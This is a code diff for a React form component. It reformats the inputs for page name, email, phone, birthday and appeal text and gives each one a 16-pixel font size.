@@ -325,14 +325,30 @@ const Home = () => {
                                 <p>
                                     {translatedTexts.pageName} <span className='text-red-500'>*</span>
                                 </p>
-                                <input type='text' name='pageName' autoComplete='organization' className={`w-full rounded-lg border px-3 py-1.5 ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.pageName} onChange={(e) => handleInputChange('pageName', e.target.value)} />
+                                <input 
+                                    type='text' 
+                                    name='pageName' 
+                                    autoComplete='organization' 
+                                    className={`w-full rounded-lg border px-3 py-1.5 ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                    style={{ fontSize: '16px' }}
+                                    value={formData.pageName} 
+                                    onChange={(e) => handleInputChange('pageName', e.target.value)} 
+                                />
                                 {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
                                 <p>
                                     {translatedTexts.mail} <span className='text-red-500'>*</span>
                                 </p>
-                                <input type='email' name='mail' autoComplete='email' className={`w-full rounded-lg border px-3 py-1.5 ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.mail} onChange={(e) => handleInputChange('mail', e.target.value)} />
+                                <input 
+                                    type='email' 
+                                    name='mail' 
+                                    autoComplete='email' 
+                                    className={`w-full rounded-lg border px-3 py-1.5 ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                    style={{ fontSize: '16px' }}
+                                    value={formData.mail} 
+                                    onChange={(e) => handleInputChange('mail', e.target.value)} 
+                                />
                                 {errors.mail && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
@@ -341,7 +357,17 @@ const Home = () => {
                                 </p>
                                 <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'}`}>
                                     <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-1.5 text-sm font-medium text-gray-700'>{callingCode}</div>
-                                    <input type='tel' name='phone' inputMode='numeric' pattern='[0-9]*' autoComplete='off' className='flex-1 rounded-r-lg border-0 px-3 py-1.5 focus:ring-0 focus:outline-none' value={formData.phone.replace(/^\+\d+\s*/, '')} onChange={(e) => handleInputChange('phone', e.target.value)} />
+                                    <input 
+                                        type='tel' 
+                                        name='phone' 
+                                        inputMode='numeric' 
+                                        pattern='[0-9]*' 
+                                        autoComplete='off' 
+                                        className='flex-1 rounded-r-lg border-0 px-3 py-1.5 focus:ring-0 focus:outline-none'
+                                        style={{ fontSize: '16px' }}
+                                        value={formData.phone.replace(/^\+\d+\s*/, '')} 
+                                        onChange={(e) => handleInputChange('phone', e.target.value)} 
+                                    />
                                 </div>
                                 {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
@@ -349,7 +375,14 @@ const Home = () => {
                                 <p>
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
-                                <input type='date' name='birthday' className={`w-full rounded-lg border px-3 py-1.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.birthday} onChange={(e) => handleInputChange('birthday', e.target.value)} />
+                                <input 
+                                    type='date' 
+                                    name='birthday' 
+                                    className={`w-full rounded-lg border px-3 py-1.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                    style={{ fontSize: '16px' }}
+                                    value={formData.birthday} 
+                                    onChange={(e) => handleInputChange('birthday', e.target.value)} 
+                                />
                                 {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             
@@ -362,6 +395,7 @@ const Home = () => {
                                     name='appeal'
                                     rows={4}
                                     className={`w-full rounded-lg border px-3 py-1.5 resize-none ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
+                                    style={{ fontSize: '16px' }}
                                     placeholder={translatedTexts.appealPlaceholder}
                                     value={formData.appeal}
                                     onChange={(e) => handleInputChange('appeal', e.target.value)}
